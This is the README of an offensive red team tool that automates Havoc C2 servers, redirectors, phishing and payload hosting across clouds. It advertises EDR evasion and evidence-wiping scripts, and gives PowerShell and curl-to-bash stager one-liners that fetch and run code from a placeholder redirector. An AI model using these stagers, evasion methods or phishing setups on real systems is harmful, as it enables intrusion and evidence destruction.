# c2itall

Automated deployment of red team infrastructure: attack boxes, Havoc C2
servers and redirectors, phishing and payload hosting, distributed recon
nodes, and Phantom privacy services, on more than one cloud, with hardening
and teardown built in.

## Overview

c2itall turns a menu choice into a configured host. Each **workload**
(attack box, C2, redirector, phishing, payload server, WEBRUNNER, Phantom,
chat) is described once, in a provider-neutral profile and service play
beside its module. Each **provider** is a single cloud driver that knows how
to create, address and destroy VMs. The registry joins the two, so a new
provider serves every workload and a new workload runs on every driver-backed
provider without either side being edited. `docs/ARCHITECTURE.md` explains
the layers; `docs/EXTENDING.md` has the recipes.

## Features

- **Providers**: Azure through a cloud driver that serves every workload;
  AWS, Linode and FlokiNET through their existing plays behind explicit
  transition routes.
- **Workloads**:
  - Quick Recon Box: Kali with recon tools, Tor, torsocks and proxychains in minutes
  - Kali and Ubuntu attack boxes on Azure, AWS and Linode
  - C2 server with the Havoc framework (dev branch), shared mail stack, optional integrated tracker
  - HTTPS redirectors with legitimate cover pages, security-scanner bouncing and a shell handler
  - Phishing: MTA front with DKIM/DMARC plus a GoPhish server
  - Payload server with basic auth, IP, user-agent and rate filtering
  - WEBRUNNER distributed, geo-targeted masscan/nmap nodes
  - Phantom privacy services (VPN, DNS, Matrix, email, TAK, vault, media) and a Matrix + Element + Tailscale chat server with rolling replacement
- **Security and OPSEC**: SSH limited to the operator's /32, key-only login,
  zero-logging mode, command history suppression, memory protection, Fail2Ban,
  port randomization, secure-exit and log-cleaning scripts.
- **EDR evasion** on the C2: sleep masking, stack spoofing, AMSI/ETW patching,
  indirect syscalls, binary signature randomization.
- **Lifecycle**: durable state written before any resource exists, repeatable
  deployments, verified cleanup on failure, standalone teardown by ID that
  works from a fresh process holding no credential.

## Requirements

- Python 3.12 or newer (the Azure flow and its smoke scripts require it)
- Ansible (installed into the virtualenv by `requirements.txt`)
- Provider access:
  - Azure: the Azure CLI (`az`) with a logged-in session, or the automation
    identity created by `scripts/setup_azure_automation.py`
  - AWS: access key and secret
  - Linode: API token
  - FlokiNET: pre-provisioned servers
- A registered domain for workloads that issue Let's Encrypt certificates
- Your workstation's public IPv4; every firewall rule for SSH is scoped to it

## Installation

```bash
git clone <repo-url> c2itall
cd c2itall
python3 -m venv venv
venv/bin/pip install -r requirements.txt
venv/bin/ansible --version
```

Secrets never live in the repository. Provider credentials are read from the
environment or the vault at deploy time; `providers/<Provider>/vars.yaml`
holds only non-secret configuration. See `providers/Azure/vars.example.yaml`.

## Usage

### Interactive menu

```bash
venv/bin/python deploy.py                 # main menu
venv/bin/python deploy.py --auto-teardown # tear down automatically when a deployment fails
venv/bin/python deploy.py --help-examples
```

Main menu entries: Attack Box, C2 Infrastructure, Redirector (including a
CDN-fronted redirector), Phishing Infrastructure, Payload Server, Email
Tracker, Logging Server (RedELK), Share-Drive (Nextcloud over Tailscale),
Hashtopolis, Chat Server, Privacy Server (Phantom), Tools & Utilities, Cleanup
& Teardown.

Team services are locked to the operator by construction:

| Entry | What it deploys | Who can reach it |
|---|---|---|
| Email Tracker | Flask pixel service under `/opt/tracker` behind nginx | pixel public; dashboard from the operator /32 only |
| Logging Server | RedELK (`limited` profile) in containers; nothing onboarded | Kibana from the operator /32; beats port 5044 only to hosts named at deploy time; onboarding packages stay on the host under `/opt/redelk/` |
| Share-Drive | Phantom's Nextcloud plus Tailscale | the tailnet only: no public web ports, self-signed certificate, nothing in DNS or certificate logs |
| Hashtopolis | upstream compose stack on loopback behind nginx with TLS | UI and agent API from the operator /32 and the agent addresses given at deploy time |
| CDN-Fronted C2 Redirector | a redirector plus the provider's edge (Azure Front Door) in one deployment | beacons talk to the edge hostname; the origin admits only the edge network and drops requests without this deployment's edge identifier |

The Tools menu's Payload Generation Tools entry runs the Havoc payload
generator on a deployed C2 (from its deployment record), pulls the results to
`payloads/<deployment_id>/`, or syncs them to the C2's redirector.

Every workload menu first asks for a provider and offers only the providers
that can serve that workload and subtype. Tools & Utilities holds SSH key
generation, a read-only connectivity test and configuration validation for
every provider, the infrastructure health check, the Umbra recon tools, the
ops dashboard, Chaos C2 and WEBRUNNER.

Module controllers under `modules/` expose a `<module>_menu()` entry point;
the attack box, C2, redirector, phishing, payload server and chat controllers
also run directly as scripts (`venv/bin/python modules/c2/deploy_c2.py`). The
infrastructure-only VM has a standalone CLI:

```bash
venv/bin/python modules/infrastructure/deploy_infrastructure.py            # deploy a plain VM
venv/bin/python modules/infrastructure/deploy_infrastructure.py --health   # read tracked VM state
venv/bin/python modules/infrastructure/deploy_infrastructure.py --teardown-id <id>
venv/bin/python modules/infrastructure/deploy_infrastructure.py --teardown-all
```

### Teardown

```bash
venv/bin/python teardown.py --list
venv/bin/python teardown.py --select
venv/bin/python teardown.py --deployment-id <id> [--force]
venv/bin/python teardown.py --all [--force]
```

Teardown resolves the same provider route the deployment used. Driver-backed
providers delete only resources the deployment owns, confirm they are gone,
then archive the state record and remove keys generated for that deployment.
A failed native cleanup never falls through to legacy cleanup. The Cleanup
menu in `deploy.py` offers the same operations plus SSH key and log hygiene.

### Rolling Matrix replacement

The Chat Server menu can attach a controller-side rotation timer to an existing
Matrix deployment. It provisions a fresh server through the deployment's same
provider route, creates a limited-use registration token that expires at the
end of the grace window, posts the new URL, token and retirement deadline to a
private room on the old server, and removes the old server only after verified
replacement deployment and announcement. Interrupted provisioning is recovered
before another rotation, and failed teardown keeps the owner-only recovery
state instead of losing track of a resource.

Choose `Configure rolling Matrix replacement` in the Chat Server menu, or use
`modules/chat-server/rotate_matrix.py init` followed by `install-timer`. The
controller workstation must remain available for its user-level systemd timer.
The domain template must contain `{id}` or `{generation}`, and the generated
hostnames must be routed to each replacement by the operator's DNS automation.

## Providers

| Provider | Route | Notes |
|---|---|---|
| Azure | native driver (`utils/azure_cloud.py`) | every workload; durable state under `deployments/azure/` |
| AWS | transition (`providers/AWS/*.yml`) | attack box (all subtypes), C2, redirector, phishing, payload server, WEBRUNNER, Phantom, chat |
| Linode | transition (`providers/Linode/*.yml`) | same set as AWS |
| FlokiNET | transition (`providers/FlokiNET/*.yml`) | C2, redirector, phishing, WEBRUNNER, Phantom, chat; cleanup is manual |

Transition providers run their original localhost plays, which both create
the instance and configure it. Their repeat behaviour and cleanup are
whatever those plays do. The coverage audit shows the exact matrix:

```bash
venv/bin/python scripts/audit_provider_coverage.py
venv/bin/python scripts/audit_provider_coverage.py --require-provider azure
```

### Azure

Azure deployments create a dedicated resource group, virtual network,
network security group, static Standard IPv4, NIC and VM (Ubuntu 24.04,
Ubuntu 22.04 for Mail-in-a-Box, or the Kali marketplace image for Kali-based
workloads) with a StandardSSD managed disk. SSH is
allowed only from your public IPv4 /32, password login is disabled, and
system logs and managed boot diagnostics stay enabled. Service ports come
from the workload profile. Kali marketplace terms must be accepted before the
Quick Recon, Kali attack-box and C2 routes can provision their image.

The CDN-fronted redirector adds an Azure Front Door Standard profile to the
same resource group. The `Microsoft.Cdn` resource provider must be registered
in the subscription, and Azure refuses Front Door on Free Trial and Student
subscriptions ("Free Trial and Student account is forbidden for Azure
Frontdoor resources"); a pay-as-you-go or enterprise subscription is required.

Authentication prefers an existing `az` session and recovers an expired one
from the automation identity. Run
`venv/bin/python scripts/setup_azure_automation.py --activate` once to create
the `c2itall-automation` service principal with Contributor access to the
dedicated subscription, store its client ID, certificate, tenant and
subscription in Infisical folder `homelab`, and verify a certificate login.
Register `Microsoft.Compute` and `Microsoft.Network` and check quota, policy
and SKU availability in the chosen region before deploying. No Azure SDK is
required; the driver uses the installed CLI.

State is saved atomically with owner-only permissions under
`deployments/azure/<deployment_id>.json` before any resource is created.
Repeating a deployment with the same configuration updates the same
resources. Recovery by ID works from the Cleanup menu, `teardown.py` and the
infrastructure module. Successful state moves to `deployments/azure/archive/`;
failed state is kept for recovery. Cleanup refuses foreign groups and
unexpected resources, cancels active ARM provisioning and confirms group
deletion before removing keys generated for that deployment.

The reviewed infrastructure smoke test:

```bash
venv/bin/python deploy.py --deploy --azure-smoke --dry-run    # describe only
venv/bin/python scripts/deploy_azure_smoke.py --prepare       # commit, push, preflight, no VM
venv/bin/python deploy.py --deploy --azure-smoke --activate   # one temporary VM in East US
```

Activation commits approved paths through hooks, pushes `forgejo/public`,
archives the committed source, requires an empty target, deploys, verifies
over SSH, and requires the subscription inventory to return to its baseline.
It assumes an exclusive test subscription. Live defaults are subscription
`cc2a66d1-67c2-47ca-856f-19a4eae52cfe` and `Standard_D2as_v4`.

## Architecture in one screen

```
deploy.py ─► modules/<module>/deploy_<module>.py        controller: prompts, config
                 │  select_provider / gather_provider_config
                 ▼
         utils/provider_registry.py                      who serves what
                 │
      ┌──────────┴───────────┐
      ▼                      ▼
 driver provider        transition provider
 utils/vm_workloads     utils/legacy_provider_adapter
   adapter(driver,        └─► providers/<Dir>/<workload>.yml
           profile)
   ├─ utils/<name>_cloud.py        create / address / destroy VMs
   └─ modules/<module>/workload.py what the VM needs
      modules/<module>/service.yml how it is configured
```

- `modules/<module>/workload.py` is the whole statement of a workload's
  needs: inbound rules, image role, disk, validation, variants, the config
  keys its service play receives.
- `utils/cloud_driver.py` is the whole provider contract; `utils/azure_cloud.py`
  implements it and never names a workload.
- `utils/vm_workloads.py` holds the recoverable lifecycles (single VM,
  multi-component, scan nodes, handoff) shared by every driver and profile.
- Menus, the WEBRUNNER picker, the connectivity test, validation, health,
  teardown and the live harness ask the registry about providers instead of
  naming them.

Full description: `docs/ARCHITECTURE.md`.

## Extending

- **Add a provider**: one `CloudDriver` subclass in `utils/<name>_cloud.py`
  and one `ProviderSpec` line. Nothing under `modules/` changes.
- **Add a workload**: a controller, a profile, a service play and one
  `WorkloadSpec` line. No provider file changes.
- **Add a variant**: a catalog entry in the owning profile plus a task file;
  the menus enumerate the catalog.

Step-by-step recipes, skeletons and the validation errors you may hit:
`docs/EXTENDING.md`. `tests/fake_cloud.py` is a complete minimal driver.

## Verification

| Command | Proves |
|---|---|
| `venv/bin/python -m pytest tests/ -q` | registry validity, adapter lifecycles, provider/workload isolation, every playbook parses |
| `venv/bin/python scripts/audit_provider_coverage.py` | the provider/workload coverage matrix |
| `venv/bin/python scripts/test_provider_workload_live.py --provider <p> --workload <w>` | dry run; add `--activate` for a real deploy, SSH verification, repeat, standalone teardown and inventory restore |
| `venv/bin/python scripts/test_azure_phantom_live.py --activate [--service share]` | the Phantom handoff route on Azure, or the share drive built on it |
| `venv/bin/python smoke_test_webrunner.py --activate --operator-ip <ipv4>` | one-node Linode WEBRUNNER lifecycle |

Live runs write evidence under `logs/<provider>-<workload>-live/<deployment_id>/`
with the commit they executed from.

## Repository layout

```
deploy.py                  main menu and CLI entry
teardown.py                standalone teardown by ID, list, select, all
modules/<module>/          deploy_<module>.py controller, workload.py profile,
                           service*.yml plays, tasks/, templates/, files/
common/tasks|templates|files
                           hardening, tool install, mail, port randomization shared by plays
providers/<Provider>/      transition plays, cleanup play, infrastructure play and
                           templates for driver providers, vars.example.yaml
utils/provider_registry.py catalog of providers and workloads
utils/cloud_driver.py      provider contract
utils/<name>_cloud.py      one driver per provider
utils/vm_workloads.py      generic adapters
utils/workloads.py         profile loader
utils/state_store.py       durable state with locking and archive
utils/controller_io.py     bounded subprocesses, safe directories
utils/deployment_engine.py dispatch, playbook execution, deployment records
utils/cleanup_engine.py    teardown, key and log hygiene
scripts/                   coverage audit, live harness, Azure smoke and automation setup
tests/                     unit suite, fake driver, extension contracts
docs/                      ARCHITECTURE.md, EXTENDING.md, OPSEC.md
deployments/<provider>/    durable state and archive
logs/                      deployment logs, records and live evidence
ghost_protocol/            Phantom (submodule)
```

## Post-deployment steps

1. Configure DNS for your domain:
   - `your-domain.com` → C2 server
   - `mail.your-domain.com` → C2 server
   - `cdn.your-domain.com` → redirector (or your chosen subdomain)
   - `track.your-domain.com` → tracker, if deployed
2. Run the post-install scripts:
   ```bash
   /root/Tools/post_install_c2.sh          # on the C2 server
   /root/Tools/post_install_redirector.sh  # on the redirector
   ```
3. Generate Havoc payloads on the C2 server:
   ```bash
   /root/Tools/generate_havoc_payloads.sh
   ```

## Using Havoc C2

Havoc is installed at `/root/Tools/Havoc` on the C2 server; the teamserver
password is in `/root/Tools/Havoc/data/profiles/default.yaotl`.

```bash
git clone -b dev https://github.com/HavocFramework/Havoc.git
cd Havoc/Client && mkdir build && cd build && cmake -GNinja .. && ninja
./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
```

Payload delivery through the redirector:

```powershell
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
```

```bash
curl -s https://cdn.your-domain.com/linux_stager.sh | bash
```

## Security considerations

- `docs/OPSEC.md` lists, per module, what lands on the host, in the
  provider's metadata and on the controller, and what a teardown removes.
- Every server carries `/root/Tools/secure-exit.sh` to wipe operational data
  and `/root/Tools/clean-logs.sh` to remove evidence.
- Enable port randomization and zero-logs for sensitive operations.
- Set DKIM and DMARC records before phishing.
- Treat infrastructure as disposable; tear it down when the engagement ends.

## Disclaimer

This tool is intended for authorized red team operations, penetration
testing and security research only. Obtain proper authorization before
conducting any security testing. The authors are not responsible for misuse.
